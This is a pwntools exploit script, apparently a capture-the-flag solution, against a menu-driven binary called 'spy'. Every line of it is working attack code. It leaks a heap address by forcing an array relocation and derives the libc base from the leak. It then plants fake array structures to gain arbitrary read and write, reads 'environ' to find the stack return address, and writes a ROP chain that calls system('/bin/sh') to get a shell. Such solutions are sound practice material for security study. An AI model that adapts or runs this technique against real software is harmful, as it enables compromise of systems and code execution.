from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = ""
PORT = 1337
LOCAL = True
elf = ELF("./spy")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            c
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def add_citizen(name):
    sla(b"> ", b"1")
    sla(b": ", name)
    ru(b": ")
    return rl().strip()

def update_citizen(id, new_name):
    sla(b"> ", b"2")
    sla(b": ", id)
    sla(b": ", new_name)

def print_citizen(len):
    citizen = []
    sla(b"> ", b"3")
    for _ in range(len):
        ru(b": ")
        id = rl().strip()
        ru(b": ")
        name = rl().strip()
        citizen.append((id, name))
    return citizen

def mark_spy(id):
    sla(b"> ", b"4")
    sla(b": ", id)
    
def update_spy(new_id):
    sla(b"> ", b"5")
    sla(b": ", new_id)

def print_spy():
    sla(b"> ", b"6")
    ru(b": ")
    id = rl().strip()
    ru(b": ")
    name = rl().strip()
    return id, name


# Array relocation bump (2 * (Sn - 1) + 1): 4, 7, 13, ...
anchor_id = str(0x6666666666666666)

pig_id = add_citizen("r3kapig")
mark_spy(pig_id)
update_spy(anchor_id)

# Hit 4 to relocate
for i in range(3):
    add_citizen(str(i) * 8)

leak, _ = print_spy()
info("LEAK: " + hex(int(leak)))

id_array = int(leak) - 0x4050
name_array = id_array - 0x20
libc.address = id_array + 0x10a150
info("ID_ARRARY: " + hex(id_array))
info("NAME_ARRARY: " + hex(name_array))
info("LIBC_BASE: " + hex(libc.address))

# Hit 24 to prepare relocate
for i in range(20):
    add_citizen(str(i) * 8)
# Reolocate
mark_spy(anchor_id)
add_citizen(str(i) * 8)

update_spy(str(id_array - 0xb0 + 0x30))

# Craft payload
payload = b"AAAA" # padding
"""
Context
id_arrary = 0x7fa6694dfeb0
0x7fa6694dfe30: 0x0000000000000000      0x0000000000000000
0x7fa6694dfe40: 0x000000000000008b      0x0000000400000001
0x7fa6694dfe50: 0x00007fa6694e5ed0      0x0000000000000000
0x7fa6694dfe60: 0x000000030000008b      0x0000000400000001
0x7fa6694dfe70: 0x00007fa6694e5f00      0x0000000000000000
0x7fa6694dfe80: 0x0000001900000004      0x0000000000000030
0x7fa6694dfe90: 0x00007fa6694f7e00      0x0000000000000000
0x7fa6694dfea0: 0x000000190000001a      0x0000000000000030
0x7fa6694dfeb0: 0x00007fa6694f6e00      0x0000000000000000
0x7fa6694dfec0: 0x000000000000008b      0x0000000000000000
0x7fa6694dfed0: 0x0000000000000000      0x0000000000000000
0x7fa6694dfee0: 0x000000030000008b      0x0000000400000000
0x7fa6694dfef0: 0x00007fa6694e5f30      0x0000000000000000
"""
payload += flat(
    # Keep original data
    0x000000000000008b, 0x0000000400000001,
    id_array + 0x6020, 0,
    0x000000020000008b, 0x0000000400000000, # If this is 1, program will stuck
    id_array + 0x6050, 0,
    # name_array
    # size / type, capacity
    0x0000000100000004, 0x00000000000000ff,
    id_array + 0x17f50, 0,
    # id_array
    # size / type, capacity
    0x000000010000001a, 0x00000000000000ff,
    id_array, 0, # Point to self
    # Keep original data
    0x000000000000008b, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x000000030000008b, 0x0000000400000000,
    id_array + 0x6080,
)
payload = payload.ljust(0xc0, b"\x00")
add_citizen(payload) # prep
add_citizen(payload) # shot

mark_spy(str(id_array))

# Until now, arbitrary read/write achieved
def arbi_read(addr):
    update_spy(str(addr))
    return print_citizen(1)[0][0]

def arbi_write(addr, vals):
    update_spy(str(addr))
    for val in vals:
        temp = add_citizen("A" * 8)
        mark_spy(temp)
        update_spy(str(val))

stack_ret = int(arbi_read(libc.symbols["environ"])) - 0x130
info("STACK_RET: " + hex(stack_ret))

# ROP chain
rop = ROP(libc)
arbi_write(stack_ret, [
    rop.find_gadget(["ret"])[0],
    rop.find_gadget(["pop rdi", "ret"])[0],
    next(libc.search(b"/bin/sh")),
    libc.symbols["system"],
])

sla(b"> ", b"666")

p.interactive()
